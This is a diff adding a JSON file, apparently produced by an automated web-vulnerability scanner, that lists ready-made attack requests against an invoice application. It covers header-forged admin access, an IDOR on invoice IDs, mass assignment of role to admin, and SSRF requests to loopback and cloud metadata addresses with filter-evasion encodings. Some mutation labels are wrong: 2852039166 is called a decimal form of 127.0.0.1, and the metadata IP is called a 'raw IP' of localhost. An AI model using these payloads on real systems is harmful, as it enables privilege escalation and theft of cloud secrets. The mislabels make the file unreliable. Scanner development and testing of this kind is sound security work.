@@ -1,0 +1,368 @@
+{
+  "auth_bypass:GET /admin/settings": [
+    {
+      "endpoint": "GET /admin/settings",
+      "headers": {
+        "X-Forwarded-User": "admin"
+      },
+      "json_body": null,
+      "method": "GET",
+      "note": "scout: identity comes from request header X-Forwarded-User read in current_user()",
+      "params": {},
+      "path": "/admin/settings",
+      "vuln_class": "auth_bypass"
+    },
+    {
+      "endpoint": "GET /admin/settings",
+      "headers": {
+        "X-Forwarded-User": "Admin"
+      },
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of 'admin': capitalised value",
+      "params": {},
+      "path": "/admin/settings",
+      "vuln_class": "auth_bypass"
+    },
+    {
+      "endpoint": "GET /admin/settings",
+      "headers": {
+        "X-Forwarded-User": "ADMIN"
+      },
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of 'admin': upper-case value",
+      "params": {},
+      "path": "/admin/settings",
+      "vuln_class": "auth_bypass"
+    },
+    {
+      "endpoint": "GET /admin/settings",
+      "headers": {
+        "X-Forwarded-User": " admin"
+      },
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of 'admin': leading space",
+      "params": {},
+      "path": "/admin/settings",
+      "vuln_class": "auth_bypass"
+    }
+  ],
+  "idor:GET /invoices/{invoice_id}": [
+    {
+      "endpoint": "GET /invoices/{invoice_id}",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "scout: path id invoice_id reaches a query and the handler never reads the current user",
+      "params": {},
+      "path": "/invoices/1",
+      "vuln_class": "idor"
+    }
+  ],
+  "mass_assignment:PATCH /me": [
+    {
+      "endpoint": "PATCH /me",
+      "headers": {},
+      "json_body": {
+        "role": "admin"
+      },
+      "method": "PATCH",
+      "note": "scout: request body loop writes fields allowed by a membership test that includes role",
+      "params": {},
+      "path": "/me",
+      "vuln_class": "mass_assignment"
+    },
+    {
+      "endpoint": "PATCH /me",
+      "headers": {},
+      "json_body": {
+        "Role": "admin"
+      },
+      "method": "PATCH",
+      "note": "scout: request body loop writes fields allowed by a membership test that includes role",
+      "params": {},
+      "path": "/me",
+      "vuln_class": "mass_assignment"
+    },
+    {
+      "endpoint": "PATCH /me",
+      "headers": {},
+      "json_body": {
+        "ROLE": "admin"
+      },
+      "method": "PATCH",
+      "note": "scout: request body loop writes fields allowed by a membership test that includes role",
+      "params": {},
+      "path": "/me",
+      "vuln_class": "mass_assignment"
+    },
+    {
+      "endpoint": "PATCH /me",
+      "headers": {},
+      "json_body": {
+        " role": "admin"
+      },
+      "method": "PATCH",
+      "note": "mutation of 'role': leading space",
+      "params": {},
+      "path": "/me",
+      "vuln_class": "mass_assignment"
+    },
+    {
+      "endpoint": "PATCH /me",
+      "headers": {},
+      "json_body": {
+        "role ": "admin"
+      },
+      "method": "PATCH",
+      "note": "mutation of 'role': trailing space",
+      "params": {},
+      "path": "/me",
+      "vuln_class": "mass_assignment"
+    },
+    {
+      "endpoint": "PATCH /me",
+      "headers": {},
+      "json_body": {
+        " Role": "admin"
+      },
+      "method": "PATCH",
+      "note": "mutation of 'Role': leading space",
+      "params": {},
+      "path": "/me",
+      "vuln_class": "mass_assignment"
+    },
+    {
+      "endpoint": "PATCH /me",
+      "headers": {},
+      "json_body": {
+        "Role ": "admin"
+      },
+      "method": "PATCH",
+      "note": "mutation of 'Role': trailing space",
+      "params": {},
+      "path": "/me",
+      "vuln_class": "mass_assignment"
+    },
+    {
+      "endpoint": "PATCH /me",
+      "headers": {},
+      "json_body": {
+        " ROLE": "admin"
+      },
+      "method": "PATCH",
+      "note": "mutation of 'ROLE': leading space",
+      "params": {},
+      "path": "/me",
+      "vuln_class": "mass_assignment"
+    },
+    {
+      "endpoint": "PATCH /me",
+      "headers": {},
+      "json_body": {
+        "ROLE ": "admin"
+      },
+      "method": "PATCH",
+      "note": "mutation of 'ROLE': trailing space",
+      "params": {},
+      "path": "/me",
+      "vuln_class": "mass_assignment"
+    }
+  ],
+  "ssrf:GET /invoices/import": [
+    {
+      "endpoint": "GET /invoices/import",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "scout: parameter url is passed to fake_fetch() without a parsed-host check",
+      "params": {
+        "url": "http://127.0.0.1/latest/secret"
+      },
+      "path": "/invoices/import",
+      "vuln_class": "ssrf"
+    },
+    {
+      "endpoint": "GET /invoices/import",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "scout: parameter url is passed to fake_fetch() without a parsed-host check",
+      "params": {
+        "url": "http://169.254.169.254/latest/secret"
+      },
+      "path": "/invoices/import",
+      "vuln_class": "ssrf"
+    },
+    {
+      "endpoint": "GET /invoices/import",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "scout: parameter url is passed to fake_fetch() without a parsed-host check",
+      "params": {
+        "url": "http://localhost/latest/secret"
+      },
+      "path": "/invoices/import",
+      "vuln_class": "ssrf"
+    },
+    {
+      "endpoint": "GET /invoices/import",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "scout: parameter url is passed to fake_fetch() without a parsed-host check",
+      "params": {
+        "url": "http://metadata.internal/latest/secret"
+      },
+      "path": "/invoices/import",
+      "vuln_class": "ssrf"
+    },
+    {
+      "endpoint": "GET /invoices/import",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "scout: parameter url is passed to fake_fetch() without a parsed-host check",
+      "params": {
+        "url": "http://localhost/"
+      },
+      "path": "/invoices/import",
+      "vuln_class": "ssrf"
+    },
+    {
+      "endpoint": "GET /invoices/import",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of 'http://127.0.0.1/latest/secret': trailing dot",
+      "params": {
+        "url": "http://127.0.0.1./latest/secret"
+      },
+      "path": "/invoices/import",
+      "vuln_class": "ssrf"
+    },
+    {
+      "endpoint": "GET /invoices/import",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of 'http://127.0.0.1/latest/secret': decimal IP",
+      "params": {
+        "url": "http://2852039166/latest/secret"
+      },
+      "path": "/invoices/import",
+      "vuln_class": "ssrf"
+    },
+    {
+      "endpoint": "GET /invoices/import",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of 'http://169.254.169.254/latest/secret': trailing dot",
+      "params": {
+        "url": "http://169.254.169.254./latest/secret"
+      },
+      "path": "/invoices/import",
+      "vuln_class": "ssrf"
+    },
+    {
+      "endpoint": "GET /invoices/import",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of 'http://localhost/latest/secret': upper-case host",
+      "params": {
+        "url": "http://LOCALHOST/latest/secret"
+      },
+      "path": "/invoices/import",
+      "vuln_class": "ssrf"
+    },
+    {
+      "endpoint": "GET /invoices/import",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of 'http://localhost/latest/secret': trailing dot",
+      "params": {
+        "url": "http://localhost./latest/secret"
+      },
+      "path": "/invoices/import",
+      "vuln_class": "ssrf"
+    },
+    {
+      "endpoint": "GET /invoices/import",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of 'http://metadata.internal/latest/secret': upper-case host",
+      "params": {
+        "url": "http://METADATA.INTERNAL/latest/secret"
+      },
+      "path": "/invoices/import",
+      "vuln_class": "ssrf"
+    },
+    {
+      "endpoint": "GET /invoices/import",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of 'http://metadata.internal/latest/secret': trailing dot",
+      "params": {
+        "url": "http://metadata.internal./latest/secret"
+      },
+      "path": "/invoices/import",
+      "vuln_class": "ssrf"
+    },
+    {
+      "endpoint": "GET /invoices/import",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of 'http://localhost/': upper-case host",
+      "params": {
+        "url": "http://LOCALHOST/"
+      },
+      "path": "/invoices/import",
+      "vuln_class": "ssrf"
+    },
+    {
+      "endpoint": "GET /invoices/import",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of 'http://localhost/': trailing dot",
+      "params": {
+        "url": "http://localhost./"
+      },
+      "path": "/invoices/import",
+      "vuln_class": "ssrf"
+    },
+    {
+      "endpoint": "GET /invoices/import",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of 'http://localhost/': raw IP",
+      "params": {
+        "url": "http://169.254.169.254/"
+      },
+      "path": "/invoices/import",
+      "vuln_class": "ssrf"
+    },
+    {
+      "endpoint": "GET /invoices/import",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of 'http://localhost/': decimal IP",
+      "params": {
+        "url": "http://2852039166/"
+      },
+      "path": "/invoices/import",
+      "vuln_class": "ssrf"
+    }
+  ]
+}
